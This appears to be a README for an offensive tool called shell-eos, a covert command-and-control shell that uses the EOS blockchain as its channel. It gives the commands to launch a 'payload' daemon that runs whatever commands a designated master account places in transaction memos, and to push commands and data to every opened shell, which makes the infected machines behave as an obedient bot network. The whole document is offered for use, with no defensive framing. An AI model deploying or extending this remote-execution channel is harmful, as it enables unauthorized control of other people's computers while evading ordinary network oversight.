# shell-eos
Decentralized shell over eos blockchain to send commands by eos blockchain to the shells

## Run the shell as a payload

Run the command to start the daemond listening in the blockchain address. When receives a new transacion the shell search the command in the memo of transaction to execute it.

`python3 payloads/shell-eos.py eosaccountname accountmaster`

*account master if who the bot just obey

Send to a EOS address command line to execute orders

## Execute commands in each opened shell

`python3 payloads/send-eos.py eosaccountname` "ls -lsa"

## Publish datasets commands in each opened shell

`python3 payloads/send-eos.py eosaccountname` "data" "separator"

## Compile

`./compile.sh`

